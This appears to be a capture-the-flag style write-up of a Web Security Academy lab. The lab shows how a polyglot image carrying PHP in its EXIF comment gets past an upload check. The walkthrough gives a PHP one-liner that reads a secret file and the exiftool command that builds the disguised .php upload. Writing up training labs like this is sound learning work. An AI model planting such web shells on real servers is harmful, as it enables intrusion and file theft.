Title: Remote code execution via polyglot web shell upload
Level: PRACTITIONER
Desc:  This lab contains a vulnerable image upload function. Although it checks the contents of the file to verify that it is a genuine image, it is still possible to upload and execute server-side code.
To solve the lab, upload a basic PHP web shell, then use it to exfiltrate the contents of the file /home/carlos/secret. Submit this secret using the button provided in the lab banner.
You can log in to your own account using the following credentials: wiener:peter 

# Walkthrough:
basic php shell : `<?php echo file_get_contents('/home/carlos/secret'); ?>`
adding basic php shell in metadata of an image (polyglots)

`exiftool -Comment="<?php echo 'START ' . file_get_contents('/home/carlos/secret') . ' END'; ?>" cat.jpg -o polyglot.php`

After uploading image (php file) I go to `https://0a7a00ad03f298e48068e9da003100b2.web-security-academy.net/files/avatars/polyglot.php`
and then I look for START

<img width="516" height="147" alt="image" src="https://github.com/user-attachments/assets/acd29866-3af5-4de9-b9b5-943f3070c96f" />
